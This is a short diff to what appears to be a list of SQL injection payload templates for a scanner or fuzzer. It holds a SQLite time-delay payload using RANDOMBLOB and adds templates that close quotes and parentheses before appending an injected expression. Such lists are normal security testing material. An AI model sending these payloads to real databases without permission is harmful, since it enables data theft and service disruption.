@@ -50,3 +50,7 @@ OR 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ||{sqli}{comment}
 {quote}||{sqli}
 {quote}||{sqli}{comment}
+{quote})||{sqli}
+{quote})||{sqli}{comment}
+{quote}))||{sqli}
+{quote}))||{sqli}{comment}
